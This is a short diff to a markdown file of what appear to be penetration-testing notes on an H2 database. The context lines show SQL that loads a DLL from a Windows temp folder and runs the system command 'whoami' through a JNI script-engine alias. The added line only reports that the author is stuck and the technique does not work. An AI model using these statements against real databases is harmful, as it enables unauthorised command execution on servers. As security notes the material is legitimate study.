@@ -240,4 +240,6 @@ CALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');-- Evaluate script
 CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";  
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\\\Z").next()');
 ```
+
+Doesn't work. I think I'm stuck. Darn.
 # SYSTEM access
